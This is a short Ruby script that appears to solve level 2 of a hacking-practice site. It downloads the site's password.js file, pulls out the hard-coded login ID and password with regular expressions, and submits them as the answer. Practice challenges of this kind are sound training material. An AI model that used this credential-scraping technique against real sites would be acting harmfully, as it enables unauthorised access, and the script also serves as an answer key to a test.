# encoding: utf-8
require_relative 'hack_utils'

url = 'http://www.hackerschool.jp/hack/js/password.js'
resp  = RestClient.get url
js = resp.body
puts "--------- password in #{url} ---------"
puts js

id = js.match(/login_id\s+=\s+'(\w+?)'/).to_a[1]
pass = js.match(/login_pass\s+=\s+'(\w+?)'/).to_a[1]
puts "id:#{id}, pass: #{pass}"

HackUtils.post_answer(2, :id => id, :pass => pass)
